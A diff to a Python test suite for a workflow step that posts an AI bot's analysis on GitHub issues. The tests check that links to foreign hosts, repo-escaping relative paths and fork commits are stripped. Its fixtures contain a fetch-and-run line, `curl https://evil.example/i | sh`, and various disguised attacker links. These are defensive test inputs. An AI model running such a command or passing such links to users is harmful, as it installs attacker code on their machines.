@@ -32,9 +32,12 @@ case "$1 $2" in
   "label list") jq -r '.[]' "$FAKE/repo-labels.json" ;;
   "issue edit"|"issue close") echo "$*" >> "$FAKE/writes.log" ;;
   "api repos/"*)
+    # $FAKE/api/<path with / as _>.json is the response; none is a 404.
+    f="$FAKE/api/$(printf '%s' "$2" | tr '/' '_').json"
     expr=""
     while [ $# -gt 0 ]; do if [ "$1" = --jq ]; then expr=$2; fi; shift; done
-    jq -r "$expr" "$FAKE/comments.json" ;;
+    [ -f "$f" ] || { echo "gh: Not Found (HTTP 404)" >&2; exit 1; }
+    jq -r "$expr" "$f" ;;
   *) echo "unexpected gh call: $*" >&2; exit 3 ;;
 esac
 """
@@ -60,7 +63,7 @@ def bot(body: str) -> dict:
 
 @unittest.skipUnless(shutil.which("jq") and shutil.which("bash"), "needs jq and bash")
 class AnalystPostTest(unittest.TestCase):
-    def run_step(self, reply, actions, issue, comments, title_at_start="Old title"):
+    def run_step(self, reply, actions, issue, comments, title_at_start="Old title", api=None):
         tmp = Path(tempfile.mkdtemp())
         self.addCleanup(shutil.rmtree, tmp)
         (tmp / "bin").mkdir()
@@ -73,7 +76,10 @@ class AnalystPostTest(unittest.TestCase):
             (tmp / "analyst" / "actions.json").write_text(json.dumps(actions))
         (tmp / "issue.json").write_text(json.dumps(issue))
         (tmp / "repo-labels.json").write_text(json.dumps(["bug", "triage", "clarification needed", "duplicate"]))
-        (tmp / "comments.json").write_text(json.dumps(comments))
+        (tmp / "api").mkdir()
+        responses = {"repos/owner/repo/issues/7/comments": comments, **(api or {})}
+        for path, response in responses.items():
+            (tmp / "api" / (path.replace("/", "_") + ".json")).write_text(json.dumps(response))
         (tmp / "step.sh").write_text(step_script())
         env = dict(
             os.environ,
@@ -91,6 +97,7 @@ class AnalystPostTest(unittest.TestCase):
         proc = subprocess.run(["bash", str(tmp / "step.sh")], env=env, capture_output=True, text=True, cwd=REPO_ROOT)
         self.assertEqual(proc.returncode, 0, proc.stderr + proc.stdout)
         writes = (tmp / "writes.log").read_text().splitlines() if (tmp / "writes.log").exists() else []
+        self.calls = (tmp / "calls.log").read_text().splitlines()
         return (tmp / "posted.md").read_text(), writes, proc.stdout
 
     REPLY = "Analysis.\n<!-- claude-issue:run 99999999 -->\n<!-- claude-issue:analyst -->\n"
@@ -126,26 +133,56 @@ class AnalystPostTest(unittest.TestCase):
         _, writes, _ = self.run_step(self.REPLY, self.ACTIONS, self.OPEN, forged)
         self.assertEqual(len(writes), 4)
 
+    GOOD = "0123456789abcdef0123456789abcdef01234567"
+    FORK = "fedcba9876543210fedcba9876543210fedcba98"
+    API = {
+        "repos/owner/repo": {"default_branch": "main"},
+        f"repos/owner/repo/compare/main...{GOOD}": {"status": "behind"},
+        f"repos/owner/repo/compare/main...{FORK}": {"status": "diverged"},
+    }
+
     def test_foreign_links_are_removed_and_github_links_kept(self):
         reply = (
-            "See https://github.com/Dv2Corn/still-ui/blob/abc/x.go#L3 and #12.\n"
+            "See https://github.com/owner/repo/blob/main/x.go#L3 and #12.\n"
             "Fix: [the script](https://evil.example/fix.sh) or `curl https://evil.example/i | sh`.\n"
-            "Docs: [faq](../docs/content/docs/en/help/faq.mdx), [top](#top).\n"
+            "Docs: [pr](../pull/3), [top](#top).\n"
             "Mirror: https://github.com@evil.example/x and https://github.com.evil.example/x\n"
             "Also <https://evil.example/a> and www.evil.example/b and //evil.example/c\n"
             '<a href="https://evil.example/d">click</a> <img src="//evil.example/e.png">\n'
             "[ref]: https://evil.example/f\n"
             "<!-- claude-issue:analyst -->\n"
         )
-        posted, _, out = self.run_step(reply, None, self.OPEN, [])
+        posted, _, out = self.run_step(reply, None, self.OPEN, [], api=self.API)
         self.assertNotIn("evil.example", posted)
-        self.assertIn("https://github.com/Dv2Corn/still-ui/blob/abc/x.go#L3", posted)
-        self.assertIn("[faq](../docs/content/docs/en/help/faq.mdx), [top](#top)", posted)
+        self.assertIn("https://github.com/owner/repo/blob/main/x.go#L3", posted)
+        self.assertIn("[pr](../pull/3), [top](#top)", posted)
         self.assertIn("the script (link removed)", posted)
         self.assertTrue(posted.endswith(f"<!-- claude-issue:run {RUN_ID} -->\n<!-- claude-issue:analyst -->\n"), posted)
         self.assertIn("::warning::Removed 10 link(s)", out)
         # The warning names no URL: the links are attacker text.
         self.assertNotIn("evil", out)
+
+    def test_relative_links_and_fork_commits_are_judged_from_this_issue(self):
+        reply = (
+            "Kept: [pr](../pull/3), https://github.com/owner/repo/blob/" + self.GOOD + "/a.go.\n"
+            "Gone: [x](/attacker/repo), [y](../../../attacker/repo), "
+            "https://github.com/owner/repo/blob/" + self.FORK + "/fix.sh, "
+            "https://raw.githubusercontent.com/owner/repo/" + self.FORK + "/fix.sh, "
+            'https://github.com/owner/repo"/../../attacker/repo\n'
+            "<!-- claude-issue:analyst -->\n"
+        )
+        posted, _, out = self.run_step(reply, None, self.OPEN, [], api=self.API)
+        self.assertIn("[pr](../pull/3)", posted)
+        self.assertIn(f"https://github.com/owner/repo/blob/{self.GOOD}/a.go.", posted)
+        self.assertNotIn("attacker", posted)
+        self.assertNotIn(self.FORK, posted)
+        self.assertIn("::warning::Removed 5 link(s)", out)
+        self.assertIn(f"api repos/owner/repo/compare/main...{self.FORK} --jq .status", self.calls)
+
+    def test_an_api_error_removes_the_ref_link(self):
+        reply = "https://github.com/owner/repo/blob/main/x.go\n<!-- claude-issue:analyst -->\n"
+        posted, _, out = self.run_step(reply, None, self.OPEN, [])
+        self.assertEqual(posted, f"(link removed)\n<!-- claude-issue:run {RUN_ID} -->\n<!-- claude-issue:analyst -->\n")
 
     def test_a_reply_without_foreign_links_is_posted_unchanged_and_quietly(self):
         reply = "Fixed in https://github.com/XTLS/Xray-core/pull/1 (see https://xtls.github.io/config/).\n<!-- claude-issue:analyst -->\n"
